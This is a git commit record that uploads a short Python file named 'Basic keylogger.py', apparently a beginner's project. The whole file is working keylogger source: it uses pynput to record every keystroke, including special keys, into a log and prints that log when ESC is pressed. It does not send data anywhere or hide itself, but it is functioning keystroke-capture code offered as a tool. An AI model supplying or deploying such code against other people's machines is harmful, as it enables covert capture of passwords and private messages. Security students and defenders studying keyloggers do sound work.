cfce16fb0efa45a66688b790f750128568a5abb1
Narh Phinehas <phinehastettehnarh@gmail.com>
2024-11-08 16:24:30 +0000

    Add files via upload

---
+++ Basic keylogger.py
@@ -0,0 +1,25 @@
+from pynput import keyboard
+
+log = ""
+
+def on_press(key):
+    global log
+    try:
+        log += key.char  # For alphanumeric keys
+    except AttributeError:
+        if key == keyboard.Key.space:
+            log += " "  # Spaces between words
+        else:
+            log += f" [{key.name}] "  # Special keys (e.g., Enter, Shift)
+
+def on_release(key):
+    if key == keyboard.Key.esc:
+        # Stops listener when ESC is pressed
+        print("[+] Exiting...")
+        print("[+] Final Log:", log)
+        return False
+
+# Start listening to keystrokes
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    print("[+] Keylogger running... Press ESC to stop.")
+    listener.join()
